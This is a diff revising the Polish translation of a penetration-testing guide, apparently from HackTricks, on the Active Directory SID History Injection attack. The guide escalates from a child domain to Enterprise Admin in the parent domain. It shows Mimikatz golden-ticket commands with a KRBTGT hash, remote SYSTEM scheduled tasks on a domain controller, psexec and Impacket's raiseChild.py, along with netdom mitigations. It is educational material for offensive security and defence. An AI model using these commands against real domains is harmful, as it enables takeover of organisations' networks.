@@ -4,27 +4,27 @@
 
 ## SID History Injection Attack
 
-Celem **SID History Injection Attack** jest ułatwienie **migracji użytkowników między domenami** przy jednoczesnym zachowaniu dostępu do zasobów z poprzedniej domeny. Osiąga się to poprzez **dodanie poprzedniego Security Identifier (SID) użytkownika do SID History** jego nowego konta. Warto zauważyć, że proces ten może zostać wykorzystany do przyznania nieautoryzowanego dostępu poprzez dodanie SID grupy o wysokich uprawnieniach (takiej jak Enterprise Admins lub Domain Admins) z domeny nadrzędnej do SID History. Takie wykorzystanie zapewnia dostęp do wszystkich zasobów w domenie nadrzędnej.<sup>[[1]](#references)[[2]](#references)</sup>
+Celem **SID History Injection Attack** jest ułatwienie **migracji użytkowników między domenami** przy jednoczesnym zachowaniu dostępu do zasobów z poprzedniej domeny. Osiąga się to poprzez **dodanie poprzedniego Security Identifier (SID) użytkownika do SID History** jego nowego konta. Warto zauważyć, że proces ten może zostać wykorzystany do uzyskania nieautoryzowanego dostępu poprzez dodanie SID grupy o wysokich uprawnieniach (takiej jak Enterprise Admins lub Domain Admins) z domeny nadrzędnej do SID History. Wykorzystanie tej metody zapewnia dostęp do wszystkich zasobów w domenie nadrzędnej.<sup>[[1]](#references)[[2]](#references)</sup>
 
-Istnieją dwie metody przeprowadzenia tego ataku: poprzez utworzenie **Golden Ticket** albo **Diamond Ticket**.
+Istnieją dwie metody przeprowadzenia tego ataku: poprzez utworzenie **Golden Ticket** lub **Diamond Ticket**.
 
-Aby ustalić SID grupy **"Enterprise Admins"**, należy najpierw znaleźć SID domeny głównej. Po jego zidentyfikowaniu można skonstruować SID grupy Enterprise Admins, dopisując `-519` do SID domeny głównej. Na przykład, jeśli SID domeny głównej to `S-1-5-21-280534878-1496970234-700767426`, wynikowy SID grupy "Enterprise Admins" będzie wynosił `S-1-5-21-280534878-1496970234-700767426-519`.<sup>[[1]](#references)</sup>
+Aby ustalić SID grupy **„Enterprise Admins”**, należy najpierw znaleźć SID domeny głównej. Po jego ustaleniu można skonstruować SID grupy Enterprise Admins, dodając `-519` do SID domeny głównej. Na przykład jeśli SID domeny głównej to `S-1-5-21-280534878-1496970234-700767426`, wynikowy SID grupy „Enterprise Admins” będzie miał wartość `S-1-5-21-280534878-1496970234-700767426-519`.<sup>[[1]](#references)</sup>
 
-Można również użyć grup **Domain Admins**, których SID kończy się wartością **512**.
+Można również użyć grup **Domain Admins**, których SID kończy się na **512**.
 
-Innym sposobem na znalezienie SID grupy z innej domeny (na przykład "Domain Admins") jest:
+Innym sposobem znalezienia SID grupy z innej domeny (na przykład „Domain Admins”) jest:
 ```bash
 Get-DomainGroup -Identity "Domain Admins" -Domain parent.io -Properties ObjectSid
 ```
 > [!WARNING]
-> Pamiętaj, że możliwe jest wyłączenie SID history w relacji zaufania, co spowoduje niepowodzenie tego ataku.
+> Należy pamiętać, że możliwe jest wyłączenie SID history w relacji zaufania, co spowoduje niepowodzenie tego ataku.
 
 Zgodnie z [**dokumentacją**](https://technet.microsoft.com/library/cc835085.aspx):<sup>[[3]](#references)</sup>
-- **Wyłączenie SIDHistory w ramach forest trusts** za pomocą narzędzia netdom (`netdom trust /domain: /EnableSIDHistory:no on the domain controller`)
-- **Zastosowanie SID Filter Quarantining do external trusts** za pomocą narzędzia netdom (`netdom trust /domain: /quarantine:yes on the domain controller`)
-- **Zastosowanie SID Filtering do domain trusts w ramach jednego lasu** nie jest zalecane, ponieważ jest to nieobsługiwana konfiguracja i może powodować breaking changes. Jeśli domena w lesie jest niezaufana, nie powinna być jego członkiem. W takiej sytuacji należy najpierw podzielić zaufane i niezaufane domeny na osobne lasy, w których można zastosować SID Filtering do interforest trust
+- **Wyłączenie SIDHistory w ramach relacji zaufania między lasami** za pomocą narzędzia netdom (`netdom trust /domain: /EnableSIDHistory:no on the domain controller`)
+- **Zastosowanie SID Filter Quarantining do zewnętrznych relacji zaufania** za pomocą narzędzia netdom (`netdom trust /domain: /quarantine:yes on the domain controller`)
+- **Zastosowanie SID Filtering do relacji zaufania między domenami w ramach jednego lasu** nie jest zalecane, ponieważ jest to nieobsługiwana konfiguracja i może powodować niezgodności. Jeśli domena w ramach lasu jest niezaufana, nie powinna być członkiem tego lasu. W takiej sytuacji należy najpierw podzielić zaufane i niezaufane domeny na osobne lasy, w których można zastosować SID Filtering do relacji zaufania między lasami
 
-Więcej informacji o bypassing tego mechanizmu znajdziesz w tym poście: [**https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4**](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
+Więcej informacji na temat omijania tego zabezpieczenia znajdziesz w tym poście: [**https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4**](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)<sup>[[4]](#references)</sup>
 
 ### Diamond Ticket (Rubeus + KRBTGT-AES256)
 
@@ -80,7 +80,7 @@ diamond-ticket.md
 .\kirbikator.exe lsa .\CIFS.mcorpdc.moneycorp.local.kirbi
 ls \\mcorp-dc.moneycorp.local\c$
 ```
-Eskaluj uprawnienia do DA domeny root lub Enterprise admin, używając hasha KRBTGT przejętej domeny:
+Eskalacja do DA domeny root lub Enterprise admin przy użyciu hasha KRBTGT przejętej domeny:
 ```bash
 Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-211874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'
 
@@ -92,7 +92,7 @@ schtasks /create /S mcorp-dc.moneycorp.local /SC Weekely /RU "NT Authority\SYSTE
 
 schtasks /Run /S mcorp-dc.moneycorp.local /TN "STCheck114"
 ```
-Dzięki uzyskanym uprawnieniom w wyniku ataku możesz na przykład wykonać atak DCSync w nowej domenie:
+Dzięki uprawnieniom uzyskanym w wyniku ataku możesz na przykład przeprowadzić atak DCSync w nowej domenie:
 
 
 {{#ref}}
@@ -123,26 +123,27 @@ psexec.py <child_domain>/Administrator@dc.root.local -k -no-pass -target-ip 10.1
 ```
 #### Automatycznie za pomocą [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)
 
-Jest to skrypt Impacket, który **automatyzuje eskalację z domeny podrzędnej do nadrzędnej**. Skrypt wymaga:
+Jest to skrypt Impacket, który **automatyzuje eskalację z domeny podrzędnej do domeny nadrzędnej**. Skrypt wymaga:
 
-- Docelowego kontrolera domeny
-- Danych uwierzytelniających użytkownika administracyjnego w domenie podrzędnej
+- Kontrolera domeny docelowej
+- Creds użytkownika administracyjnego w domenie podrzędnej
 
 Przebieg:
 
-- Pobiera SID grupy Enterprise Admins z domeny nadrzędnej
+- Pobiera SID grupy Enterprise Admins domeny nadrzędnej
 - Pobiera hash konta KRBTGT w domenie podrzędnej
 - Tworzy Golden Ticket
 - Loguje się do domeny nadrzędnej
 - Pobiera dane uwierzytelniające konta Administrator w domenie nadrzędnej
-- Jeśli określono przełącznik `target-exec`, uwierzytelnia się do kontrolera domeny domeny nadrzędnej za pomocą Psexec.
+- Jeśli określono switch `target-exec`, uwierzytelnia się do kontrolera domeny domeny nadrzędnej za pomocą Psexec.
 ```bash
 raiseChild.py -target-exec 10.10.10.10 <child_domain>/username
 ```
 ## Referencje
 
 - [1] [Sneaky Active Directory Persistence #14: SID History - adsecurity.org](https://adsecurity.org/?p=1772)
-- [2] [Czym jest Security Identifier (SID)? - SentinelOne](https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/)
+- [2] [Czym jest identyfikator zabezpieczeń (SID)? - SentinelOne](https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/)
 - [3] [Zagadnienia bezpieczeństwa dotyczące relacji zaufania - Microsoft TechNet](https://technet.microsoft.com/library/cc835085.aspx)
+- [4] [itm8.com - Filtrowanie SID jako granica bezpieczeństwa między domenami, część 4](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
 
 {{#include ../../banners/hacktricks-training.md}}
